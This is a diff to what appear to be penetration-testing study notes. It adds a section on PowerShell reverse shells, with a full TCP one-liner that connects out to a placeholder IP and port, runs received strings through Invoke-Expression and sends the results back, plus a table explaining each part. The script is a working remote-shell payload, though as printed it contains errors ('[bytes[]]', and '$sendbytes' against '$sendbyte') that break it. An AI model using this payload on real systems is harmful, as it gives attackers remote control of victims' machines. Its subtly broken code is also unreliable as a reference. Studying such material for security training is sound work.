@@ -242,3 +242,31 @@ press y;
 |new-object|cmdlet, which allows us to instantiate either a .Net Framework or a COM object|
 |WebClient class | used to access resources identified by a URI|
 |DownloadFile public method| Requires two key parameters a source location(URI),, and a target location where the retrieved data will be stored|
+
+## PowerShell Reverse Shells
+- PowerShell one-liners
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
+$stream = $client.GetStream();
+[bytes[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0)
+{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding])::ASCII.GetBytes($sendback2);
+    $stream.Write($sendbytes, 0, $sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+```
+
+|option|functionality|
+|---|---|
+|client variable| we assign target IP address|
+|stream variable| for getting stream |
+|Byte array| bytes|
+|While loop| several lines responsible for reading and writing data to the network stream|
+
+_note: iex = Invoke-Expression cmdlet is a key part of this code chunk as it runs any string it receives as a command_
